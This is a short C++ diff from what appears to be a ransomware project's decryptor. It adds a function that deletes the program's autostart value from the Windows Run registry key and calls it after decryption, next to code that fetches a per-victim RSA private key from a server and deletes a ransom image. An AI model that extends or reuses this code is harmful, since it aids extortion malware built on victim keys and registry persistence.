@@ -4,6 +4,17 @@ std::string hex_to_string(const std::string& input);
 static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor);
 
+void deleteFromRegistrey()
+{
+	HKEY hKey = nullptr;
+	long lReturn = RegOpenKeyEx(HKEY_CURRENT_USER,
+		_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+		0L,
+		KEY_ALL_ACCESS,
+		&hKey);
+	RegDeleteValue(hKey, _T("My_Program"));
+}
+
 Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor)
 {
 	string url = URL_PRIVATE_RSA + id;
@@ -404,7 +415,7 @@ int decryption_main()
 	remove(pathToID);
 	string pathToImage = get_path_to_jpeg();
 	remove(pathToImage);
-
+	deleteFromRegistrey();
 	return 0;
 }
 
